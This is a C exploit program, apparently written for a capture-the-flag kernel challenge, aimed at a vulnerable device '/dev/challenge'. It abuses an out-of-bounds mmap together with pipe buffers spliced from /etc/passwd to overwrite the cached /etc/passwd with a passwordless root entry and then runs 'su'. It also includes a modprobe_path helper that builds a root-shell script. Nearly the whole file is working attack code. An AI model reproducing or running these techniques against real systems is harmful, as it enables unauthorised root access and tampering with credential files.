#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <err.h>
#include <errno.h>
#include <sys/mman.h>

// commands
#define DEV_PATH "/dev/challenge"   // the path the device is placed

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)

// globals
// (END globals)

// utils
#define WAIT(void) {getc(stdin); \
                    fflush(stdin);}
#define ulong unsigned long
#define scu static const unsigned long
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) \
                            errExit("KMALLOC"); \
                        }

static void print_hex8(char* buf, size_t len)
{
    uint64_t* tmp = (uint64_t*)buf;

    for (int i = 0; i < (len / 8); i++) {
        printf("%p ", tmp[i]);
        if ((i + 1) % 2 == 0) {
            printf("\n");
        }
    }

    printf("\n");
}

static void shell_modprobe()
{
    system("echo '#!/bin/sh' > /home/user/hax; echo 'setsid cttyhack setuidgid 0 \
           /bin/sh' >> /home/user/hax");
    system("chmod +x /home/user/hax");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/user/roooot");
    system("chmod +x /home/user/roooot");
    system("/home/user/roooot");
}

struct pt_regs {
	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
	ulong orig_ax; ulong ip; ulong cs; ulong flags;
    ulong sp; ulong ss;
};

static void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}

ulong user_cs,user_ss,user_sp,user_rflags;
// should compile with -masm=intel
static void save_state() {
    __asm__("mov %0, cs\n"
            "mov %1, ss\n"
            "pushfq\n"
            "popq %2\n"
            :"=r"(user_cs),"=r"(user_ss),"=r"(user_rflags)
            :
            :"memory"
    );
}

void info(const char *format, ...) {
    va_list args;
    va_start(args, format);

    printf("[+] ");
    vprintf(format, args);

    va_end(args);
}

#define PAGE_COUNT 128
#define PAGE_SIZE 4096
int pipes[0x10][0x02];

void alloc_pipe_buf(int i)
{
    if (pipe(pipes[i]) < 0) {
        perror("[X] alloc_pipe_buff()");
        return;
    }
}

int main(void) {
    int ret;
    int fd = open(DEV_PATH, O_RDWR);

    if (fd < 0) {
        errExit("Failed to open dev file\n");
    }

    uint8_t* data = (uint8_t*)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, PAGE_COUNT*PAGE_SIZE);
    if (data == MAP_FAILED) {
        errExit("Failed to map\n");
    }

    /**
     * Alternate way to trigger the oob using mremap:
     * void *ptr = mmap(0, N_PAGES * PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
     * ptr = mremap(ptr, N_PAGES * PAGE_SIZE, PAGE_SIZE * N_PAGES + 1, MREMAP_MAYMOVE);
     *
     */

    int fd_passwd = open("/etc/passwd", O_RDONLY);
    if (fd_passwd < 0) {
        errExit("Failed to open /etc/passwd");
    }

    for(int i = 0; i < 0x10; i++) {
        alloc_pipe_buf(i);
        //write(pipes[i][1], "hello", 5);
    }

    for (int i = 0x0; i < 0x10; i++) {
        ret = splice(fd_passwd, NULL, pipes[i][1], NULL, 1 ,0);
        if (ret  < 0 || ret == 0) {
            errExit("splice");
        }
    }

    //memset(data, 0, PAGE_COUNT*PAGE_SIZE);
    // Accessing the 128th page

    const char *const root = "root::0:0:root:/root:/bin/sh\n";
    strcpy(data, root);

    info("Calling system \n");
    system("cat /etc/passwd");
    system("su");

    WAIT();
}
